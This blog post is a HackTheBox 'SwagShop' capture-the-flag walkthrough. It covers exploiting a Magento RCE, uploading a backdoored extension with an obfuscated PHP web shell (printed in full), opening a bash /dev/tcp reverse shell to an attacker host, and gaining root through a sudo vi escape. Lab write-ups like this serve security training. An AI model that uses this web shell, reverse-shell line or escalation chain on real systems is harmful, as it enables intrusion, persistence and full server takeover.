---
title: "HackTheBox - WriteUp 2"
date: 2019-05-13T22:20:40+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# SwagShop

## Reference

1. Check here for more details about linux command utils: https://gtfobins.github.io/
2. https://packetstormsecurity.com/files/133327
3. http://10.10.10.140/app/etc/local.xml
4. https://github.com/lavalamp-/LavaMagentoBD
5. https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
6. http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/

## Step 1: NMAP

Opened Port: 80, 22.

Apache2 with Ubuntu 18.04, SSH Useless...

## Step 2: SearchSploit

> For OSCP Preparation: Use Searchsploit to search exploit-db.com and modify it to your case.
> Leave the metasploit alone.

```bash
$ searchsploit -m exploits/xml/webapps/37977.py
------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                             |  Path (/opt/searchsploit/)
------------------------------------------------------------------------------------------------------------------------------------------------
Magento eCommerce - Remote Code Execution                  | exploits/xml/webapps/37977.py
------------------------------------------------------------------------------------------------------------------------------------------------
```

Found the RCE, next modify it. Maybe the creator want to let us know more about what's behind, he even not wrote correct URL rewrite in Apache.

```python
target = "http://10.10.10.140/"
target_url = target + "/index.php" + "/admin/Cms_Wysiwyg/directive/index/"
```

Why do I modify this file?  Check the last reference. 

Run the script and go to the admin panel to do the next step.

## Step 3: Normal User

Execute the Python Script. Use "forme:forme" to login `/downloader` administration extension panel.

Then, modify the webshell:

```bash
$ git clone https://github.com/lavalamp-/LavaMagentoBD
```

Go to the `LavaMagentoBD/Backdoor Code/app/code/community/Lavalamp/Connector/controllers/IndexController.php`, Open `AntSword`.

Insert the corresponding call URL to the `AntSword` and then generate an one-line shell like this:

```php
<?php $RQUC=create_function(chr(01306-01242).chr(786-671).str_rot13('b').base64_decode('bQ==').str_rot13('r'),chr(0x202-0x19d).str_rot13('i').chr(0x1149a/0x2da).chr(063030/0362).chr(01374-01324).str_rot13('$').chr(0x30d-0x29a).base64_decode('bw==').str_rot13('z').chr(0401-0234).chr(0x3488/0x148).chr(53985/915));$RQUC(base64_decode('MTk4N'.'TE5O0'.'BldkF'.'sKCRf'.''.chr(0233163/01647).str_rot13('R').chr(306-249).chr(990-906).chr(51600/600).''.''.chr(0134760/01250).chr(0x211-0x19d).chr(037260/0354).chr(0x6b30/0x118).base64_decode('MA==').''.'ZnZnh'.'0dl0p'.'OzU5N'.'TU1Nz'.'s='.''));?>
```

Don't forget the password the software gives you. Then make a `md5sum` of this php file, and change the corresponding value in the `LavaMagentoBD/Backdoor Code/package.xml`. Next, According the project readme, repack it and upload to the downloader panel. Now you have the reverse shell. Use AntSword as you pleased.

## Step 3: Before privilege escalation

After you get the reverse shell as www-data, just `cat /etc/passwd` to get the user `haris`, and next, `cat /home/haris/user.txt`, you get the normal user token.

Carefully check the `ls -alh /home/haris`, found `.sudo_as_administrator_successful` (something like), you know that you need to escalate with `sudo`.

## Step 4: Get interactive shell and escalate

Check GTFOBINS and machine, found Python3 with bash.

Use the following commands to get the interactive shell:

```bash
$ export RHOST=<YOUR IP>
$ nc -lp 14445
$ bash -c 'bash -i &>/dev/tcp/$RHOST/14445 0<&1'
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

## Step 5: Escalate

Get the spawned interactive shell and run `sudo -l`, found:

```bash
$ sudo -l
root (NOPASSWD:ALL):/usr/bin/vi /var/www/html/*
```

**USE THE ABSOLUTE PATH** to get the root shell without any password and do the f*cking things you want:

```bash
$ sudo /usr/bin/vi /var/www/html/test.sh
```

Then `:!cat /root/root.txt` get the root token. 

Finished!

# Help

ON THE WAY...
